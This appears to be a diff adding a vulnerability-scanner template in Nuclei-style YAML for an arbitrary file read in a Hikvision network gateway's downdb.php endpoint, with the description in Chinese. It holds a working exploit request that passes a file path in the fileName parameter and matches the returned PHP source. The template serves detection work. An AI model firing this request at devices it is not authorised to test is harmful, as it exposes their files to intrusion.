@@ -1,0 +1,29 @@
+id: hikvision-ncg-downdb-fileread
+
+info:
+  name: 海康威视联网网关 downdb.php 任意文件读取
+  author: peiqi
+  severity: high
+  description: |
+    海康威视联网网关 /localDomain/downdb.php 的 fileName 参数可读取 Web 根目录任意文件，官方复现读取 downdb.php 源码。
+    与流媒体管理服务器、视频编码设备接入网关不是同一 SKU。
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  tags: hikvision,ncg,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/localDomain/downdb.php?fileName=web/html/localDomain/downdb.php"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "$file_name=$_GET['fileName']"
+          - "Content-Disposition"
+        condition: and
